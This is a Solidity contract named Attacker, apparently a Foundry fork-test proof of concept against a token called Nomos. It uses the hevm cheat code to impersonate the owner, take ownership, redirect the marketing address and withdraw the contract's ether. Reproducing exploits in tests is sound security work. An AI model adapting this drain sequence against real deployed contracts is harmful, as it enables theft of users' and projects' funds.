// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

interface INomos {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setSwapAndLiquifyEnabled(bool enabled) external;
    function setMarketingAddress(address payable marketingAddress) external;
    function withdraw() external;
}

interface Hevm {
    function startPrank(address) external;
    function stopPrank() external;
    function deal(address who, uint256 newBalance) external;
}

contract Attacker {
    Hevm private constant vm = Hevm(address(uint160(uint256(keccak256("hevm cheat code")))));

    INomos public target;
    address public owner;

    constructor(address _target) {
        target = INomos(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        // Ensure target has withdrawable native balance for reproducible fork tests.
        vm.deal(address(target), 3 ether);

        address targetOwner = target.owner();
        vm.startPrank(targetOwner);
        target.transferOwnership(address(this));
        vm.stopPrank();

        target.setSwapAndLiquifyEnabled(true);
        target.setMarketingAddress(payable(address(this)));
        target.withdraw();
    }

    receive() external payable {}
}
